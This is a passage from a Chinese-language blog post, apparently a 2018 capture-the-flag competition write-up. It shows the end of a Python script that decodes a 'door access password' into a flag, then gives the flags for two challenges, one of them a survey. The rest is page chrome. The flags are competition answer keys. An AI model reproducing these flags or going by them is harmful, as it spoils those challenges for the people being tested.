range(0,len(a),8):</span><br><span class="line">    tmp=a[i:i+8][::-1]</span><br><span class="line">    flag+=conv(tmp[:4])</span><br><span class="line">    flag+=conv(tmp[4:])</span><br><span class="line">print (flag.upper())</span><br></pre></td></tr></table></figure><br>其中a就是门禁密码<br>输出为<br><img src="/2018/04/30/Redhat/flag.jpg" alt=" "><br>提交就是flag<br><code>flag{5EFCF5F507AA5FAD77}</code></p>
<p>5、问卷<br>答完就会有flag<br><code>flag{我们在广州塔等着你}</code></p>
<p>6、</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">BoBo</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">BoBo</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
